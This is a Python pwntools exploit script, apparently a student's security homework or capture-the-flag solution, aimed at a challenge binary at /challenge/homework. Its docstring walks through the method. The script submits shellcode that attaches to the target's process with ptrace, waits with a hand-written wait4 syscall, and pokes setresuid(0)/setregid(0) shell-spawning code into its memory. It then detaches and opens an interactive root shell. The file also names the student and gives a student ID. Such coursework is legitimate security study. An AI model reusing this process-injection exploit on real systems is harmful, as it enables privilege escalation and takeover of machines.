#!/usr/bin/env python3

UID = 119362914
Name = "Sparsh Mehta / hutgrabber"
"Homework 2"

import sys
from time import sleep
import pwn
import os

"""
Steps to perform injection using PTRACE:
1. For performing this exploit, the I/O needs to be handled. The menu that is printed, has many options. All of this can be handled
    using the io.sendline() function.
2. There is a little issue that is present that arises while handling the IO of the program. There is an extra line that gets printed
    when the arg GDB is provided with the program. To handle this, there is an `if` statement that runs while receiving IO.
3. Before PTRACE injection is done, the following documentation needs to be looked at:
    https://sites.uclouvain.be/SystInfo/usr/include/sys/ptrace.h.html
    https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
4. With the help of given documentation, it becomes easier to use PTRACE functions and set the registers while writing shellcode.
5. The shellcode is a little complicated in this exploit. A part of the shellcode is hardcoded. The shellcode is generated using
    `shellcraft()`, however, there is no `wait4()` module in the pwn shellcraft package.
6. The assembly code for wait4() is written through the WAITFOUR string which can be later assembled using `pwn.asm()`.
7. In order to fully generate shellcode for this exploit, we use the PTRACE_ATTACH function to kind of pause the program,
    then we use the WATIFOUR syscall to make the program wait. The we use the `poketext()` function which I have defined. This function takes
    an offset and appends shellcode at 8 byte intervals (because it's a 32 bit binary).
8. Once the poketext payload is added to the shellcode string, then we can call the `infloop()` function from shellcraft. This is the entire shellcode.
9. The shellcode is now packed with the `pwn.asm()` function and sent into the program after following the option 1 from the menu. The byte size is decided
    after checking arbitrary sizes one after the other and checking the stack in GDB as to how the shellcode is "fitting" in memory. In my case,
    setting the size to `400` works best.
"""

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw, aslr=True)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw )


# Binary Path
binPath = "/challenge/homework"

gdbscript = """
break *main+738
continue
""".format(**locals())

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.log_level = "critical"


io=start()
io.recvlines(5) # main menu
io.sendline(b"2")
if pwn.args.GDB:
    io.recvlines(2) # Debug information:
else:
    io.recvline()
_, pid = io.recvline().strip().split(b" = ")
pid = pid.decode()
offset=0x401830
shell = pwn.asm(pwn.shellcraft.setresuid(0)+pwn.shellcraft.setregid(0)+pwn.shellcraft.sh())

def poketext(shell, offset):
    poketext_shellcode=""
    for i in range(0,len(shell),8):
        data = shell[i:i+8].ljust(8,b'\x90')
        data = pwn.u64(data)
        addr = offset+i
        payload = pwn.shellcraft.amd64.linux.ptrace(PTRACE_POKETEXT, pid, addr, data)
        poketext_shellcode+=payload
    return poketext_shellcode

PTRACE_POKETEXT = 4
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
WUNTRACED = 2

WAITFOUR = f"""
mov rax, 0x3d;
mov rdi, {pid};
mov rsi, 0x00;
mov rdx, {WUNTRACED};
syscall;
"""

offset = 0x40183b
shellcode =  pwn.shellcraft.amd64.linux.ptrace(PTRACE_ATTACH, pid, 0, 0)
shellcode += WAITFOUR
shellcode += poketext(shell, offset)
shellcode += pwn.shellcraft.amd64.linux.ptrace(PTRACE_DETACH, pid, 0, 0)
shellcode += pwn.shellcraft.infloop()
shellcode = pwn.asm(shellcode)


io.recvlines(5) # main menu
io.sendline(b"1")

io.recvline()  # how big do you want your memory to be?
io.sendline(b"400")

io.recvline()
io.sendline(b"6") # permissions

io.recvline() # what would you like to include?
io.sendline(shellcode)
_, buffer_address = io.recvline().strip().split(b" at ") # wrote buffer at
io.recvlines(5)
io.sendline(b"3")
io.recvline()
io.sendline(buffer_address)
io.interactive()